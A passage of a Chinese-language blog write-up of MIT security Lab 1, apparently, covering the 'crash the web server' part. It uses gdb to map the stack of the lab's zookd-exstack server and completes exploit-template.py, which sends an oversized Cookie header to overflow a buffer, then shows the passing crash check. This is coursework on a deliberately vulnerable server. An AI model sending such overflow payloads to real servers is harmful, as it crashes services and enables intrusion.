+<h3 id="IV-Crash-the-web-server"><a href="#IV-Crash-the-web-server" class="headerlink" title="IV. Crash the web server!"></a>IV. Crash the web server!</h3><h4 id="First-Figure-out-the-stack-layout"><a href="#First-Figure-out-the-stack-layout" class="headerlink" title="First. Figure out the stack layout"></a>First. Figure out the stack layout</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在后台启动服务器</span></span><br><span class="line">./clean-env.sh ./zookd-exstack 8080 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 pgrep 查找 zookd 进程号，最小的进程号是父进程</span></span><br><span class="line">pgrep zookd-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 gdb 附加到父进程</span></span><br><span class="line">gdb -p 78032</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 gdb 跟踪 fork 出来的子进程</span></span><br><span class="line">(gdb) <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">(gdb) <span class="built_in">set</span> detach-on-fork off</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置断点</span></span><br><span class="line">(gdb) b http_request_headers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让 gdb 继续执行</span></span><br><span class="line">(gdb) c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起恶意 HTTP 请求（在另一个终端）</span></span><br><span class="line">python3 exploit-template.py localhost 8080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看栈帧</span></span><br><span class="line">(gdb) info frame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看栈上变量地址</span></span><br><span class="line">(gdb) p &amp;r</span><br><span class="line">(gdb) p &amp;value</span><br><span class="line">(gdb) p &amp;envvar</span><br><span class="line"></span><br><span class="line"><span class="comment"># （可选）查看静态变量地址</span></span><br><span class="line">(gdb) p &amp;buf</span><br></pre></td></tr></table></figure>
+
+<p><strong>栈的布局如下图所示:</strong></p>
+<img src="../../../../images/MIT/LAB1_01.png" alt="" style="width: 70%; margin-top: 20px;">
+
+<h4 id="Second-Construct-an-invalid-HTTP-request"><a href="#Second-Construct-an-invalid-HTTP-request" class="headerlink" title="Second. Construct an invalid HTTP request"></a>Second. Construct an invalid HTTP request</h4><p>由上图可知，想要实施栈溢出攻击并使 web 服务进程崩溃，可以有如下两种方法:</p>
+<ol>
+<li>头部名长度超过 512 + 512 + 8 + 8 - 5(“HTTP_”) 字节</li>
+<li>头部值长度超过 512 + 8 + 8 字节</li>
+</ol>
+<p>由此完善实验提供的 <code>exploit-template.py</code> 程序:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">shellcode: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="comment">## Things that you might find useful in constructing your exploit:</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment">##   urllib.parse.quote_from_bytes(s).encode(&#x27;ascii&#x27;)</span></span><br><span class="line">    <span class="comment">##     returns string s with &quot;special&quot; characters percent-encoded</span></span><br><span class="line">    <span class="comment">##   struct.pack(&quot;&lt;Q&quot;, x)</span></span><br><span class="line">    <span class="comment">##     returns the 8-byte binary encoding of the 64-bit integer x</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确保程序一定会崩溃，设置一个增量</span></span><br><span class="line">    n = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造一个超长的头部名</span></span><br><span class="line">    header_name = <span class="string">b&quot;A&quot;</span> * (<span class="number">512</span> + <span class="number">512</span> + <span class="number">16</span> - <span class="number">5</span> + n)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造一个超长的头部值</span></span><br><span class="line">    header_value = <span class="string">b&quot;A&quot;</span> * (<span class="number">512</span> + <span class="number">16</span> + n)</span><br><span class="line"></span><br><span class="line">    req_value = <span class="string">b&quot;GET / HTTP/1.0\r\n&quot;</span> + \</span><br><span class="line">                <span class="string">b&quot;Cookie: &quot;</span> + header_value + <span class="string">b&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    req_env = <span class="string">b&quot;GET / HTTP/1.0\r\n&quot;</span> + \</span><br><span class="line">              header_name + <span class="string">b&quot;: &quot;</span> + <span class="string">b&quot;value\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> req_value</span><br></pre></td></tr></table></figure>
+
+<p>根据实验手册的指引，运行 <code>make check-crash</code>，通过测试（评测的原理是检查 <code>/tmp/strace.log</code> 当中是否有 <code>SIGSEGV</code> 字符串）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./check-bin.sh</span><br><span class="line">tar xf bin.tar.gz</span><br><span class="line">./check-unlink.sh</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> ./exploit-2*.py; <span class="keyword">do</span> ./check-crash.sh zookd-exstack <span class="variable">$f</span>; <span class="keyword">done</span></span><br><span class="line">PASS ./exploit-2.py</span><br></pre></td></tr></table></figure>
+
+</div>
+    </div>
+    <footer class="article-footer">
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a></li></ul>
+
+    </footer>
+  </div>
+  
+  
+    
+<nav class="article-nav pt-4 mt-3" id="article-nav">
+  
+  
+    <a href="/2025/08/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC10%E8%AE%B2-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">操作系统-第十讲-可执行文件</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+</div>
+    </section>
+    <footer class="footer pt-5 mt-5">
+  <div class="container">
+    <div class="py-3">
+      <div class="row justify-content-between">
+        <div class="col-6">
+          <img class="filter-gray mb-3 lazyload" height="40" data-src="/images/DMX_cat.jpg" alt="Hexo" role="img">
+          <p class="mb-4"></p>
+          <ul class="list-inline">
+            
+              <li class="list-inline-item">
+                <a target="_blank" rel="noopener" href="https://zhwangart.com">
+                  <img 0="微博" src="/images/icons/contact_weibo.svg">
+                </a>
+              </li>
+            
+              <li class="list-inline-item">
+                <a href="javascript:;">
+                  <img 0="微信" src="/images/icons/contact_wechat.svg">
+                </a>
+              </li>
+            
+              <li class="list-inline-item">
+                <a href="mailto:a@abc.com">
+                  <img 0="邮箱" src="/images/icons/contact_email.svg">
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+        <div class="col-4">
+          <h5>友情链接</h5>
+          <ul class="list-inline">
+            
+              <li class="list-inline-item">
+                <a href="https://acorn.imaging.xin/" title="Acorn" target="_blank" rel="noopener">Acorn</a>
+              </li>
+            
+              <li class="list-inline-item">
+                <a href="https://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+              </li>
+            
+              <li class="list-inline-item">
+                <a href="https://github.com/" title="GitHub" target="_blank" rel="noopener">GitHub</a>
+              </li>
+            
+              <li class="list-inline-item">
+                <a href="https://duoyu.wang/" title="To Base64" target="_blank" rel="noopener">To Base64</a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+    <hr class="hr" style="opacity: .25;">
+    <div class="pt-3 pb-5">
+      <ul class="list-inline mb-0 text-center">
+        <li class="list-inline-item">&copy; 2025 Hexo</li>
+        
+        <li class="list-inline-item">Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+        <li class="list-inline-item">Designer <a href="https://acorn.imaging.xin/" target="_blank">DM-X~X~X</a></li>
+      </ul>
+    </div>
+  </div>
+</footer>
+  </main>
+  <div id="mobile-nav-dimmer"></div>
+<div id="mobile-nav">
+	<div id="mobile-nav-inner">
+		<ul class="mobile-nav">
+  
+    
+  <li class="nav-item ">
+    <a class="nav-item-link" href="/">首页</a>
+  </li>
+  
+    
+  <li class="nav-item ">
+    <a class="nav-item-link" href="/stories">故事</a>
+  </li>
+  
+    
+  <li class="nav-item ">
+    <a class="nav-item-link" href="/archives">博客</a>
+  </li>
+  
+    
+  <li class="nav-item ">
+    <a class="nav-item-link" href="/about">关于</a>
+  </li>
+  
+</ul>
+		
+	</div>
+</div>
+
+  <script src="/libs/feather/feather.min.js"></script>
+<script src="/libs/lazysizes/lazysizes.min.js"></script>
+
+	<script src="/libs/tocbot/tocbot.min.js"></script>
+	<script>
+    tocbot.init({
+      // Where to render the table of contents.
+      tocSelector: '.js-toc',
+      // Where to grab the headings to build the table of contents.
+      contentSelector: '.js-toc-content',
+      // Which headings to grab inside of the contentSelector element.
+      headingSelector: 'h2, h3',
+      // For headings inside relative or absolute positioned containers within content.
+      hasInnerContainers: true,
+    });
+	</script>
+
+
+
+
+
+<script src="/js/mobile-nav.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+</body>
+</html>
